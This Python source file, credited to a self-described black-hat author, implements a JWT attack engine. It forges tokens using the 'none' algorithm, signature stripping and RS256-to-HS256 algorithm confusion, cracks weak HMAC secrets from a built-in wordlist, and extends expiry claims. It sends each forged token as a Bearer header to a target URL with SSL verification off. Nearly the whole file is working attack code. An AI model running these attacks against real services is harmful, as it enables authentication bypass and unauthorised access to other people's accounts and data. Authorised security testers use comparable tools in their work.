# modules/attacks/jwt_attacks.py

"""
JSON Web Token Attack Engine
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Advanced JWT attack module for token analysis,
algorithm confusion, key cracking, and manipulation.
"""

import json
import base64
import hashlib
import hmac
import time
from typing import Dict, List, Any, Optional, Tuple, Union
from dataclasses import dataclass, field

import requests
from requests.exceptions import RequestException, Timeout, ConnectionError


@dataclass
class JWTResult:
    """Represents JWT attack result."""
    token: str
    attack_type: str
    algorithm: str
    header: Dict[str, Any]
    payload: Dict[str, Any]
    signature: str
    vulnerable: bool
    modified_token: Optional[str]
    description: str


class JWTAttacker:
    """
    JWT attack engine.
    
    Performs various attacks on JWT tokens including
    algorithm confusion, signature bypass, and brute force.
    """
    
    COMMON_SECRETS = [
        'secret', 'password', 'changeme', 'admin',
        'key', 'private', 'jwt_secret', 'jwt_key',
        'secretkey', 'secret123', 'mysecret',
        'your-256-bit-secret', 'test', 'testing',
    ]
    
    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the JWT attacker.
        
        Args:
            target: Target URL
            config: Configuration dictionary
        """
        self.target = target if target else ''
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        self.timeout = self.config.get('timeout', 30)
        self.verify_ssl = self.config.get('verify_ssl', False)
        self.results: List[JWTResult] = []
        self.errors: List[str] = []
        self.scan_status: str = 'initialized'
    
    def _ensure_bytes(self, data: Union[str, bytes]) -> bytes:
        """
        Ensure data is in bytes format.
        
        Args:
            data: String or bytes
            
        Returns:
            Bytes representation
        """
        if isinstance(data, str):
            return data.encode('utf-8')
        return data
    
    def _normalize_secret(self, secret: Union[str, bytes]) -> bytes:
        """
        Normalize secret to bytes for HMAC operations.
        
        Args:
            secret: Secret string or bytes
            
        Returns:
            Bytes secret
        """
        return self._ensure_bytes(secret)
    
    def _safe_b64_decode(self, data: str) -> Optional[bytes]:
        """
        Safely decode base64 with padding handling.
        
        Args:
            data: Base64 encoded string
            
        Returns:
            Decoded bytes or None
        """
        try:
            # Add padding if needed
            padding = 4 - (len(data) % 4)
            if padding != 4:
                data += '=' * padding
            return base64.urlsafe_b64decode(data)
        except (base64.binascii.Error, ValueError, TypeError):
            return None
    
    def _validate_token(self, token: str) -> Tuple[bool, str]:
        """
        Validate JWT token format.
        
        Args:
            token: JWT token string
            
        Returns:
            Tuple of (is_valid, error_message)
        """
        if not token:
            return False, "Token is empty"
        
        parts = token.split('.')
        
        if len(parts) != 3:
            return False, f"Invalid token format: expected 3 parts, got {len(parts)}"
        
        for part in parts[:2]:
            if not part:
                return False, "Empty token part found"
        
        return True, ""
    
    def _get_algorithm(self, header: Dict[str, Any]) -> str:
        """
        Safely get algorithm from header.
        
        Args:
            header: JWT header
            
        Returns:
            Algorithm string
        """
        return header.get('alg', 'unknown')
    
    def _check_response_valid(self, response: Optional[requests.Response]) -> bool:
        """
        Check if response is valid.
        
        Args:
            response: HTTP response
            
        Returns:
            True if response is valid
        """
        if response is None:
            return False
        if not hasattr(response, 'status_code'):
            return False
        return True
    
    def decode_jwt(self, token: str) -> Tuple[Dict[str, Any], Dict[str, Any], str]:
        """
        Decode JWT token without verification.
        
        Args:
            token: JWT token string
            
        Returns:
            Tuple of (header, payload, signature)
            
        Raises:
            ValueError: If token format is invalid
        """
        # Validate token first
        valid, error = self._validate_token(token)
        if not valid:
            raise ValueError(error)
        
        parts = token.split('.')
        
        def decode_part(part: str) -> Dict[str, Any]:
            decoded_bytes = self._safe_b64_decode(part)
            if decoded_bytes is None:
                return {}
            try:
                return json.loads(decoded_bytes.decode('utf-8'))
            except (json.JSONDecodeError, UnicodeDecodeError):
                return {}
        
        header = decode_part(parts[0])
        payload = decode_part(parts[1])
        signature = parts[2]
        
        return header, payload, signature
    
    def _encode_part(self, data: Dict[str, Any]) -> str:
        """
        Encode a JWT part.
        
        Args:
            data: Dictionary to encode
            
        Returns:
            Base64 encoded string
        """
        try:
            json_str = json.dumps(data, separators=(',', ':'))
            return base64.urlsafe_b64encode(json_str.encode()).rstrip(b'=').decode()
        except (TypeError, ValueError):
            return ''
    
    def encode_jwt(
        self,
        header: Dict[str, Any],
        payload: Dict[str, Any],
        secret: Union[str, bytes] = ''
    ) -> str:
        """
        Encode a JWT token.
        
        Args:
            header: JWT header
            payload: JWT payload
            secret: Signing secret (string or bytes)
            
        Returns:
            Encoded JWT string
        """
        header_b64 = self._encode_part(header)
        payload_b64 = self._encode_part(payload)
        
        if not header_b64 or not payload_b64:
            return f"{header_b64}.{payload_b64}."
        
        if secret:
            algorithm = self._get_algorithm(header)
            
            if algorithm.startswith('HS'):
                # Normalize secret to bytes
                secret_bytes = self._normalize_secret(secret)
                message = f"{header_b64}.{payload_b64}".encode()
                
                # Choose hash function based on algorithm
                if '384' in algorithm:
                    hash_func = hashlib.sha384
                elif '512' in algorithm:
                    hash_func = hashlib.sha512
                else:
                    hash_func = hashlib.sha256
                
                signature = hmac.new(secret_bytes, message, hash_func).digest()
                signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
                return f"{header_b64}.{payload_b64}.{signature_b64}"
        
        return f"{header_b64}.{payload_b64}."
    
    def test_none_algorithm(self, token: str) -> JWTResult:
        """
        Test None algorithm attack.
        
        Args:
            token: JWT token
            
        Returns:
            JWTResult object
        """
        try:
            header, payload, signature = self.decode_jwt(token)
            
            none_header = header.copy()
            none_header['alg'] = 'none'
            
            modified_token = self.encode_jwt(none_header, payload)
            
            vulnerable = False
            if self.target:
                test_url = self.target
                headers = {'Authorization': f'Bearer {modified_token}'}
                
                try:
                    response = self.session.get(
                        test_url,
                        headers=headers,
                        timeout=self.timeout,
                        verify=self.verify_ssl
                    )
                    vulnerable = response.status_code == 200
                except RequestException:
                    pass
            
            result = JWTResult(
                token=token,
                attack_type='None Algorithm',
                algorithm='none',
                header=header,
                payload=payload,
                signature=signature,
                vulnerable=vulnerable,
                modified_token=modified_token if vulnerable else None,
                description='Server accepts JWT with "none" algorithm'
            )
            
            self.results.append(result)
            return result
            
        except Exception as e:
            self.errors.append(f"None algorithm attack failed: {str(e)}")
            
            return JWTResult(
                token=token,
                attack_type='None Algorithm',
                algorithm='unknown',
                header={},
                payload={},
                signature='',
                vulnerable=False,
                modified_token=None,
                description=f'Error: {str(e)}'
            )
    
    def test_algorithm_confusion(self, token: str, public_key: Optional[str] = None) -> JWTResult:
        """
        Test algorithm confusion (RS256 to HS256).
        
        Args:
            token: JWT token
            public_key: Public key for RS256 verification
            
        Returns:
            JWTResult object
        """
        try:
            header, payload, signature = self.decode_jwt(token)
            
            if header.get('alg', '').startswith('RS') and public_key:
                confused_header = header.copy()
                confused_header['alg'] = 'HS256'
                
                modified_token = self.encode_jwt(confused_header, payload, public_key)
                
                vulnerable = False
                if self.target:
                    test_url = self.target
                    headers = {'Authorization': f'Bearer {modified_token}'}
                    
                    try:
                        response = self.session.get(
                            test_url,
                            headers=headers,
                            timeout=self.timeout,
                            verify=self.verify_ssl
                        )
                        vulnerable = response.status_code == 200
                    except RequestException:
                        pass
                
                result = JWTResult(
                    token=token,
                    attack_type='Algorithm Confusion',
                    algorithm='HS256',
                    header=header,
                    payload=payload,
                    signature=signature,
                    vulnerable=vulnerable,
                    modified_token=modified_token if vulnerable else None,
                    description='RS256 token accepted with HS256 algorithm using public key'
                )
                
                self.results.append(result)
                return result
            
        except Exception as e:
            self.errors.append(f"Algorithm confusion attack failed: {str(e)}")
        
        return JWTResult(
            token=token,
            attack_type='Algorithm Confusion',
            algorithm='unknown',
            header={},
            payload={},
            signature='',
            vulnerable=False,
            modified_token=None,
            description='Algorithm confusion test not applicable'
        )
    
    def test_signature_bypass(self, token: str) -> JWTResult:
        """
        Test signature bypass by removing signature.
        
        Args:
            token: JWT token
            
        Returns:
            JWTResult object
        """
        try:
            header, payload, signature = self.decode_jwt(token)
            
            modified_token = f"{token.rsplit('.', 1)[0]}."
            
            vulnerable = False
            if self.target:
                test_url = self.target
                headers = {'Authorization': f'Bearer {modified_token}'}
                
                try:
                    response = self.session.get(
                        test_url,
                        headers=headers,
                        timeout=self.timeout,
                        verify=self.verify_ssl
                    )
                    vulnerable = response.status_code == 200
                except RequestException:
                    pass
            
            result = JWTResult(
                token=token,
                attack_type='Signature Bypass',
                algorithm=header.get('alg', 'unknown'),
                header=header,
                payload=payload,
                signature=signature,
                vulnerable=vulnerable,
                modified_token=modified_token if vulnerable else None,
                description='Server accepts JWT without signature'
            )
            
            self.results.append(result)
            return result
            
        except Exception as e:
            self.errors.append(f"Signature bypass attack failed: {str(e)}")
            
            return JWTResult(
                token=token,
                attack_type='Signature Bypass',
                algorithm='unknown',
                header={},
                payload={},
                signature='',
                vulnerable=False,
                modified_token=None,
                description=f'Error: {str(e)}'
            )
    
    def test_weak_secret(self, token: str) -> Optional[JWTResult]:
        """
        Test for weak HMAC secret.
        
        Args:
            token: JWT token
            
        Returns:
            JWTResult object if secret found, None otherwise
        """
        try:
            header, payload, signature = self.decode_jwt(token)
            
            algorithm = header.get('alg', 'HS256')
            
            if not algorithm.startswith('HS'):
                return None
            
            # Try to decode signature
            signature_bytes = self._safe_b64_decode(signature)
            if signature_bytes is None:
                return None
            
            message = f"{token.split('.')[0]}.{token.split('.')[1]}".encode()
            
            for secret in self.COMMON_SECRETS:
                secret_bytes = self._normalize_secret(secret)
                
                if algorithm == 'HS256':
                    computed = hmac.new(secret_bytes, message, hashlib.sha256).digest()
                elif algorithm == 'HS384':
                    computed = hmac.new(secret_bytes, message, hashlib.sha384).digest()
                elif algorithm == 'HS512':
                    computed = hmac.new(secret_bytes, message, hashlib.sha512).digest()
                else:
                    continue
                
                if hmac.compare_digest(computed, signature_bytes):
                    result = JWTResult(
                        token=token,
                        attack_type='Weak Secret',
                        algorithm=algorithm,
                        header=header,
                        payload=payload,
                        signature=signature,
                        vulnerable=True,
                        modified_token=None,
                        description=f'JWT secret found: {secret}'
                    )
                    
                    self.results.append(result)
                    return result
            
        except Exception as e:
            self.errors.append(f"Weak secret test failed: {str(e)}")
        
        return None
    
    def test_expiration_bypass(self, token: str) -> JWTResult:
        """
        Test expired token acceptance.
        
        Args:
            token: JWT token
            
        Returns:
            JWTResult object
        """
        try:
            header, payload, signature = self.decode_jwt(token)
            
            if 'exp' in payload:
                expired_payload = payload.copy()
                expired_payload['exp'] = int(time.time()) + 86400
                
                modified_token = self.encode_jwt(header, expired_payload)
                
                vulnerable = False
                if self.target:
                    test_url = self.target
                    headers = {'Authorization': f'Bearer {modified_token}'}
                    
                    try:
                        response = self.session.get(
                            test_url,
                            headers=headers,
                            timeout=self.timeout,
                            verify=self.verify_ssl
                        )
                        vulnerable = response.status_code == 200
                    except RequestException:
                        pass
                
                result = JWTResult(
                    token=token,
                    attack_type='Expiration Bypass',
                    algorithm=header.get('alg', 'unknown'),
                    header=header,
                    payload=payload,
                    signature=signature,
                    vulnerable=vulnerable,
                    modified_token=modified_token if vulnerable else None,
                    description='Server does not verify JWT expiration claim'
                )
                
                self.results.append(result)
                return result
            
        except Exception as e:
            self.errors.append(f"Expiration bypass test failed: {str(e)}")
        
        return JWTResult(
            token=token,
            attack_type='Expiration Bypass',
            algorithm='unknown',
            header={},
            payload={},
            signature='',
            vulnerable=False,
            modified_token=None,
            description='Token has no expiration claim'
        )
    
    def analyze_token(self, token: str) -> Dict[str, Any]:
        """
        Analyze JWT token for security issues.
        
        Args:
            token: JWT token
            
        Returns:
            Dictionary with analysis results
        """
        try:
            header, payload, signature = self.decode_jwt(token)
            
            issues = []
            
            if header.get('alg') == 'none':
                issues.append('Token uses "none" algorithm')
            
            if header.get('alg', '').startswith('HS') and len(signature) < 32:
                issues.append('Weak signature length')
            
            if 'exp' not in payload:
                issues.append('No expiration claim (exp)')
            
            if 'iat' not in payload:
                issues.append('No issued at claim (iat)')
            
            if 'jti' not in payload:
                issues.append('No JWT ID claim (jti)')
            
            sensitive_claims = ['password', 'ssn', 'credit_card', 'secret']
            for claim in sensitive_claims:
                if claim in payload:
                    issues.append(f'Sensitive data in payload: {claim}')
            
            return {
                'header': header,
                'payload': payload,
                'algorithm': header.get('alg', 'unknown'),
                'signature_length': len(signature),
                'has_expiration': 'exp' in payload,
                'issues': issues,
                'is_valid_format': True,
            }
            
        except Exception as e:
            return {'error': str(e), 'is_valid_format': False}
    
    def run(self, token: str, public_key: Optional[str] = None) -> Dict[str, Any]:
        """
        Run all JWT attacks.
        
        Args:
            token: JWT token to attack
            public_key: Public key for RS256 tokens
            
        Returns:
            Dictionary with attack results
        """
        # Reset state
        self.results.clear()
        self.errors.clear()
        self.scan_status = 'running'
        
        # Validate token
        valid, error = self._validate_token(token)
        if not valid:
            self.errors.append(error)
            self.scan_status = 'failed'
            return {
                'findings': [],
                'errors': self.errors,
                'token_analysis': {'error': error, 'is_valid_format': False},
                'attacks_performed': 0,
                'vulnerabilities_found': 0,
                'scan_status': 'failed',
            }
        
        # Analyze token
        analysis = self.analyze_token(token)
        
        # Run attacks
        self.test_none_algorithm(token)
        self.test_signature_bypass(token)
        self.test_weak_secret(token)
        self.test_expiration_bypass(token)
        
        if public_key:
            self.test_algorithm_confusion(token, public_key)
        
        self.scan_status = 'completed'
        
        findings = []
        for result in self.results:
            if result.vulnerable:
                findings.append({
                    'type': f'JWT Attack: {result.attack_type}',
                    'severity': 'high',
                    'algorithm': result.algorithm,
                    'vulnerable': result.vulnerable,
                    'description': result.description,
                    'modified_token': result.modified_token,
                })
        
        return {
            'findings': findings,
            'errors': self.errors,
            'token_analysis': analysis,
            'attacks_performed': len(self.results),
            'vulnerabilities_found': len(findings),
            'scan_status': self.scan_status,
        }
